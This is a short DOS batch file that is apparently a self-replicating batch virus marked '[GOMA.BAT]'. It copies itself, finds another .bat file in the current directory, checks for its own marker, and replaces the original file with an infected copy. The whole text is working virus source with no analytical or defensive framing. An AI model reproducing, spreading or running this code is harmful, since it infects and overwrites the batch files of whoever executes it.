@echo off%[GOMA.BAT]%
if not exist %0.bat goto fim
type %0.bat > tmp1
for %%f in (*.bat) do set var=%%f 
type %var% >> tmp1
echo.>> tmp1
find /i "[GOMA.BAT]" <%var% >nul
if not errorlevel 1 GOTO fim
:infecta
erase %var%
ren tmp1 %var%
:fim
deltree /y tmp1 >nul
set var=